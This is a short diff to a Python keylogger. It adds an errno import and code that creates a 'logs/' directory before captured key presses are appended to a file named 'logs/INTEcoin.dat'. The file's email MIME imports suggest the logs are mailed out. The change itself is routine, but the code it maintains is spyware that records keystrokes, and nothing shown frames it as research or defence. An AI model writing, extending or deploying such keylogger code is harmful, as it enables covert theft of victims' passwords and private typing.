@@ -5,6 +5,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+import errno
 import os
 
 # Settings
@@ -43,6 +44,12 @@ class Keylogger():
         Saves the log in a dat file.
         :param log: An array of pressed keys.
         """
+        if not os.path.exists(os.path.dirname("logs/")):
+            try:
+                os.makedirs(os.path.dirname("logs/"))
+            except OSError as exc: # Guard against race condition
+                if exc.errno != errno.EEXIST:
+                    raise
         with open("logs/INTEcoin.dat", "ab") as file:
             toWrite = ""
             for i, key in enumerate(log): # Removes repeated spaces and enters
